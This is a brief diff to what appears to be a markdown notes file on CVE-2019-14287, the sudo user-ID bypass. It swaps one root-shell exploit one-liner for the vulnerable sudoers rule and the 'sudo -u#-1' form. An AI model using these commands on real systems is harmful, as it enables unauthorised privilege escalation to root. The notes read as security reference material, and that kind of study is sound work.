@@ -197,7 +197,8 @@ pdf @main
 
 ```
 CVE-2019-14287
-sudo -u \#$((0xffffffff)) /bin/bash
+<user> ALL=(ALL:!root) NOPASSWD: ALL
+sudo -u#-1 command
 ```
 
 
